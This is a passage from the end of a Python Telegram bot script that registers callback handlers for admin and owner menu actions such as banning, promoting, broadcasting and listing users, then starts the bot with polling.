    bot_app.add_handler(CallbackQueryHandler(admin_revoke_callback, pattern="^admin_revoke$"))
    bot_app.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast$"))
    bot_app.add_handler(CallbackQueryHandler(process_delete_unused_callback, pattern="^delunused_"))
    bot_app.add_handler(CallbackQueryHandler(revoke_manual_callback, pattern="^revoke_manual$"))
    bot_app.add_handler(CallbackQueryHandler(owner_callback, pattern="^owner$"))
    bot_app.add_handler(CallbackQueryHandler(owner_pause_callback, pattern="^owner_pause$"))
    bot_app.add_handler(CallbackQueryHandler(owner_promote_callback, pattern="^owner_promote$"))
    bot_app.add_handler(CallbackQueryHandler(owner_demote_callback, pattern="^owner_demote$"))
    bot_app.add_handler(CallbackQueryHandler(owner_ban_callback, pattern="^owner_ban$"))
    bot_app.add_handler(CallbackQueryHandler(owner_unban_callback, pattern="^owner_unban$"))
    bot_app.add_handler(CallbackQueryHandler(owner_list_admins_callback, pattern="^owner_list_admins$"))
    bot_app.add_handler(CallbackQueryHandler(owner_list_users_callback, pattern="^owner_list_users$"))
    bot_app.add_handler(CallbackQueryHandler(owner_cancel_membership_callback, pattern="^owner_cancel_membership$"))
    bot_app.add_handler(CallbackQueryHandler(owner_api_status, pattern="^owner_api_status$"))
    bot_app.add_handler(CallbackQueryHandler(owner_stop_callback, pattern="^owner_stop$"))
    bot_app.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))

    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))

    print("✅ Bot started! Ctrl+C to stop.")
    bot_app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
